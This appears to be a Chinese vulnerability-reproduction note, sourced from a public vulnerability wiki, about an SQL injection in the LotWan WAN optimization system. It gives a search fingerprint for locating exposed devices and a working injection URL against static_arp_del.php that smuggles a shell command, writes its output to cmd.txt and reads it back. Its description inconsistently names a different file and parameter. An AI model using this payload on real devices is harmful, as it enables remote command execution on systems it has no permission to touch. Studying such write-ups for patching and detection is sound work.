---
title: "华夏创新 LotWan广域网优化系统 static_arp_del.php SQL注入漏洞"
date: 2026-10-18 09:15:50
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "华夏创新-LotWan广域网优化系统"
tags:
  - "华夏创新-LotWan广域网优化系统"
  - "SQL注入"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

华夏创新 LotWan广域网优化系统check_instance_state.php文件参数 ins存在命令拼接，导致远程命令执行漏洞

## 漏洞影响

```
华夏创新 LotWan广域网优化系统
```

## 网络测绘

```
title="LotWan 广域网优化系统"
```

## 漏洞复现

登录页面

![image-20220519182931309](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191829394.png)

存在漏洞的文件为 static_arp_del.php, 通过union注入写入文件

```
/acc/bindipmac/static_arp_del.php?x=1&arpName=1' and 0 union select 1,'||id>cmd.txt||',3,4,5,6,7,8--
```

再访问 `/acc/bindipmac/cmd.txt`

![image-20220519182946695](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191829769.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-LotWan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
